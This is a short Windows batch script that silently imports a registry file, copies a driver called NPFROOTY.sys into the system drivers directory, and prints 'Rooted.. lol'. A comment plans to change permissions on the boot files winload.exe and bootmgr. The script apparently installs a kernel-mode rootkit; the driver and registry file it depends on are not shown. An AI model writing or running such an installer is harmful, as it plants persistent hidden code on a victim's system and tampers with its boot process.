@echo off
regedit /S install.reg
copy NPFROOTY.sys %windir%\system32\drivers\

rem FIXME: do permissions on winload.exe and bootmgr

echo Rooted.. lol
pause